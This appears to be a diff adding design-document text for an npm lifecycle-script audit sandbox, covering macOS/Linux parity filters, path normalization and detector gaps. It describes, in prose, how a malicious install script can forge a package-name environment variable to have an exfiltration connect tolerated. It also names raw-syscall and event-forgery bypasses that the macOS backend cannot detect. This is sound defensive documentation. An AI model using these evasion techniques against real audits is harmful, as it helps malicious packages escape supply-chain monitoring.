+  > its acknowledged `postinstall` phase could `connect` to an **arbitrary** host and
+  > have it tolerated — the exception is destination-agnostic by necessity (no sound
+  > host pin on an observe-only backend whose offline counterpart records nothing). It
+  > is bounded by: the allowlist is a FIXED repo-committed list, the connect stays
+  > VISIBLE in both the lock and the parity report, and **Firecracker (offline Phase B)
+  > — never macOS-bare — is the egress enforcement boundary**.
+  >
+  > **Inherited residual — forgeable package LABEL (adversarial review round 11,
+  > ACCEPTED owner decision).** The allowlist keys on the package label `f.pkg`, and
+  > that label is **not** a CI-controlled fact: the guest derives it from the observed
+  > process's own `npm_package_name`/`npm_package_version` env via a `/proc/<pid>/environ`
+  > walk (`src/guest/attribution.ts:188-205`). A malicious lifecycle script of *some
+  > other* package can spawn a child with forged `npm_package_name=puppeteer`, so that
+  > child's exfil `connect` is recorded under `puppeteer@…` **upstream**, and the differ
+  > — seeing only the lock — tolerates it. This is the **known, documented v1
+  > attribution limitation** (`attribution.ts:188-195` `TODO(v2)`; `docs/design.md` "Not
+  > defended … the complete fix is UID separation"; pinned by
+  > `test/guest/attribution.test.ts`), surfacing through a new path — **not** a new
+  > hole. It is **not closeable in the differ**: the *entire* divergent block (its
+  > writes, its connects, its key) is attributed by the same forgeable env, so there is
+  > no un-forgeable signal in the lock to distinguish a real puppeteer download from a
+  > forgery, and tolerating puppeteer's *legitimate* download connect (required for a
+  > green gate) inherently tolerates a forged one. The earlier write-derived gate was
+  > forgeable the *same* way (`.sentinel` mint, round 3); moving to a label key did not
+  > add forgeability, it exposed the shared root cause. It is **bounded** by the same
+  > two facts as above: (1) the label is **orthogonal to enforcement** — Firecracker/
+  > Linux Phase B is offline, so egress is BLOCKED regardless of which package the
+  > connect is labelled under; this name-keyed allowlist only applies on macOS-bare,
+  > which is explicitly *not* the egress boundary; and (2) the connect stays **SURFACED**
+  > (mislabelled, never hidden) in both the lock and the parity report (`3e` pins both
+  > bounds). The complete fix is **v2 attribution hardening** (trusted lifecycle roots /
+  > UID separation), out of scope for the parity differ.
+
+- **Parity-only noise filters: env/read GLOBAL, spawn PACKAGE-SCOPED.** The
+  reconciliation waivers in `scripts/parity-diff.ts` are split by how the signal
+  arises (adversarial review finding #3). The env reads (`LD_PRELOAD` ⇄
+  `DYLD_INSERT_LIBRARIES`, `SCRIPT_JAIL_*`, `COREPACK_HOME`, `VP_HOME`, the
+  libSystem/CF/dyld probes, locale internals) and the host-resolver connects are
+  **global**: each is read AMBIENTLY by the harness's own injection/loader
+  machinery inside EVERY audited process, so it appears in every package's list,
+  deduped to a set, and is one-sided BY CONSTRUCTION (each OS reads its own
+  injection var — verified against real linux + macOS-bare locks). Scoping those
+  to a package would mean listing them under all packages for zero gain, and a
+  deliberate package read is invisible anyway (it folds into the ever-present
+  ambient entry; removing the waiver would just fail parity on every run). The
+  only sound separation of "harness read it" vs "package read it" is producer-side
+  bootstrap tagging — future work, out of scope for the diff layer. By contrast
+  the **spawn** waivers (esbuild's `$PKG/bin/esbuild --version`; simple-git-hooks'
+  `git config` probe in both its `sh -c …` and `<AUDIT_BLIND> …` forms) are
+  **package-scoped**: each is reconciled ONLY inside the package it was observed
+  in, so an unrelated package cannot launder it as host noise. Every waiver is an
+  EXACT match (no prefixes), so a novel env name or spawn fails closed as a diff.
+
+- **Agent events-file write.** The audit agent writes its own event stream to a
+  JSONL file at `$TMPDIR/<hash>/<hash>.jsonl`. That is the agent's **own**
+  instrumentation write, not dependency behavior, so `src/guest/phase-install.ts`
+  drops the write to the agent's own events-file path from `escaped_writes`
+  (matched against the canonical + resolved events-file path) and it never
+  appears in the lock. This runs in the guest, so it applies on **both**
+  platforms — Linux Firecracker/Docker and the VZ Linux guest alike. A committed
+  baseline generated **before** this fix still lists `$TMPDIR/<hash>/<hash>.jsonl`
+  in `escaped_writes` and must be regenerated.
+
+- **`/private` realpath canonicalization.** On macOS `/var`, `/tmp`, and `/etc`
+  are symlinks into `/private`, so the absolute path the shim resolves (via
+  `F_GETPATH`/`realpath`) comes back as `/private/var/...`, `/private/tmp/...`,
+  `/private/etc/...`. `normalize.ts` strips the `/private` prefix (darwin-gated)
+  **before** tokenization and noise filtering, so the canonical `/var`, `/tmp`,
+  `/etc` forms match both the tokenize roots and the shared system-noise
+  prefixes the Linux side uses. The rewrite is segment-bounded: `/private/var`
+  rewrites, `/private/variant` does not.
+
+- **macOS system-noise prefixes.** The shim, unlike strace, surfaces the dyld
+  runtime and Apple framework reads a hardened-runtime Node and the bundled
+  plain-arm64 shell/coreutils substitutes perform at startup. `normalize.ts` drops these as system noise
+  **only when `os === 'darwin'`**: `/System/`, root-level `/Library/` (the
+  per-user `/Users/<u>/Library` is **not** dropped — it can hold real package
+  writes), the `dyld_shared_cache_*` image, the dyld state store under
+  `/var/db/dyld/`, and the provisioned-node toolchain cache (matched by its
+  fixed `script-jail-cache` directory segment — the macOS analog of the Linux
+  `/opt/vp` noise prefix). The darwin gate is a **security boundary**: a
+  malicious Linux lockfile must never be able to smuggle macOS-shaped paths
+  (e.g. a `/System/...` write inside a package dir) past a Linux audit gate
+  that would otherwise drop them. The shared `/usr/lib`, `/usr/share`, and
+  `/dev` prefixes apply on both platforms.
+
+- **Case-insensitive filesystem caveat.** The default macOS volume (APFS) is
+  **case-insensitive but case-preserving**, whereas the Linux audit rootfs is
+  case-sensitive. A lifecycle script that reads `README.md` then `readme.md`
+  observes one inode on macOS and two distinct paths on Linux; tokenization
+  preserves the as-spelled casing, so the two sides can render different
+  `external_reads` entries. Real packages rarely depend on this, but a fixture
+  that exercises mixed-case paths can diverge. If you hit it, normalize the
+  fixture's casing rather than weakening the comparator — case-folding paths
+  globally would mask genuine cross-package escapes that differ only by case.
+
+- **Host-toolchain exec: ENOENT vs ok.** The Linux audit ships a deliberately
+  minimal rootfs (no `gcc`, no `python`, no host `git`), so a script that
+  shells out to a build toolchain records the `exec` attempt with an ENOENT
+  result. A developer Mac (or a `macos-14` runner) usually has the Xcode
+  Command Line Tools installed, so the **same** exec succeeds (`ok`). Both
+  sides record the spawn attempt, but the result differs. Constrain the parity
+  fixture to packages that do not shell to host toolchains; if a fixture must,
+  the spawn result — not just the path — will surface as a diff. Do **not**
+  blanket-canonicalize spawn results to attempt-only: that would erase the
+  Linux signal that an exec was blocked.
+
+- **Dropped `audit_bypass` detectors.** Three `audit_bypass` event kinds are
+  **strace-derived** and have no macOS equivalent, because there is no kernel
+  syscall channel to cross-check the libc-level shim against:
+  `<SYSCALL_EXEC_BYPASS>` (a raw `syscall(SYS_execve, …)` that skipped every
+  libc wrapper), `<EVENTS_FILE_FORGERY>` (a non-shim-loaded pid writing forged
+  events into the trusted JSONL channel), and `<UNRESOLVED_PATH>` (a
+  dirfd/cwd-relative open the strace canonicalizer could not resolve). These
+  **never** appear in macOS-bare goldens. The filesystem-based events-file
+  tamper detector still fails closed on macOS, and `<EXEC_FAIL_OPEN>` /
+  `<AUDIT_FD_LOST>` are still emitted by the shim/preload layers. This is an
+  inherent fidelity gap of a no-strace backend: **Firecracker remains the
+  high-assurance backend**; the macOS bare backend trades some kernel-level
+  cross-checks for a VM-free, CI-native macOS audit.
+
 ## Cross-host parity testing
 
 Two separate contracts back the "byte-equal lockfile" claim, and they are
